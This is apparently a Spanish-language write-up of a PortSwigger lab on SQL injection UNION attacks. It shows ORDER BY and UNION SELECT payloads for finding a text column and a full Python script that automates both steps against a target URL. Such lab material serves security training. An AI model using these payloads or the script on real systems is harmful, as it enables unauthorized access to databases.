---
title: "04 SQL injection UNION attack, finding a column containing text"
collection: publications
category: portswigger
permalink: /publications/04_SQL injection UNION attack, finding a column containing text
excerpt: 'Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categoría de productos. Para resolver el laboratorio, realizamos un ataque de inyección SQL que devuelve una fila adicional que contiene el valor proporcionado. Esta técnica nos ayuda a determinar qué columnas son compatibles con datos de cadena.'
date: 2024-12-01
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'SQL injection UNION attack, finding a column containing text'
---

![logo]({{site.url}}/images/SQLi/sqli-4/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/SQLi/sqli-4/descripcion.png)

## Objetivo del laboratorio

Realizar un ataque de inyección SQL UNION que devuelva una fila adicional que contenga el valor proporcionado. Esta técnica le ayudará a determinar qué columnas son compatibles con datos de cadena.

## Determinar el numero de columnas retornadas por la consulta

Miramos la cantidad decolumnas retornar hasta que arroje error. Vemos que nos arroja 3 columnas.

```javascript
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

![Columnas]({{site.url}}/images/SQLi/sqli-4/columnas.png)

## Miramos que columna es de tipo 'String'

Inyectamos en cada una de ellas mirando cual podemos inyectar 'String'

```javascript
' UNION SELECT 'A', NULL, NULL--
' UNION SELECT NULL, 'A', NULL--
' UNION SELECT NULL, NULL, 'A'--
```

Como se observa el campo 2 es inyectable.

![Inyectable]({{site.url}}/images/SQLi/sqli-4/valor string.png)

Ahora procedemos a ingresar el valor que nos proporciona la plataforma a inyectar y poder completar el laboratorio

![Inyectable 2]({{site.url}}/images/SQLi/sqli-4/valor string 2.png)

```javascript
' UNION SELECT NULL, '7niuyJ', NULL--
```

![Inyectable]({{site.url}}/images/SQLi/sqli-4/Resuelto.png)

# Codigo Python
```python
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_column_number(url):
    path = "/filter?category=Gifts"
    for i in range(1,50):
        sql_payload = "'+order+by+%s--" %i
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i -1
        i = i + 1
    return False

def exploit_sqli_string_field(url, num_col):
    path = "/filter?category=Gifts"
    for i in range(1, num_col+1):
        string = "'92xeVZ'"
        payload_list = ['null'] * num_col
        payload_list[i-1] = string
        sql_payload = "' union select " + ','.join(payload_list) + "--"
        r = requests.get(url +path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if string.strip('\'') in res:
            return i
    return False

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print('[-] Usage: %s <url>' % sys.argv[0])
        print('[-] Example: %s www.example.com' % sys.argv[0])
        sys.exit(-1)

    print("[+] Figuring out number of columns...") 
    num_col = exploit_sqli_column_number(url)
    if num_col:
        print("[+] The number of columns is " + str(num_col) + ".")
        print("[+] Figuring out which column contains text...")
        string_column = exploit_sqli_string_field(url, num_col)
        if string_column:
            print("[+] The column that contains text is " + str(string_column)+".")
        else: 
            print("[-] We were not able to find a colimn that has a string data type.")
    else:
        print("[-] The SQLi attack was not successful.")
```